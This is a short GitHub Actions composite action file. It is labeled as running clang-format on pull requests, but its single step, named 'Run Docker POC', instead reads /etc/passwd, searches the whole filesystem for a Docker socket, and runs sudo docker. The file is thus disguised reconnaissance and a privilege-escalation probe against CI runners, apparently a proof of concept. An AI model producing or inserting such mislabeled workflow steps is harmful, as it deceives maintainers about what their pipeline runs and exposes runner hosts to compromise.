name: 'clang-format'
description: 'Run clang-format on pull request'
inputs:
  path:
    description: Path to the checkout
    required: true

runs:
  using: "composite"
  steps:
  - name: Run Docker POC
    shell: bash
    run: |
      whoami
      cat /etc/passwd
      find / -name docker.sock 2> /dev/null
      sudo ./${{ inputs.path }}/docker ps -a
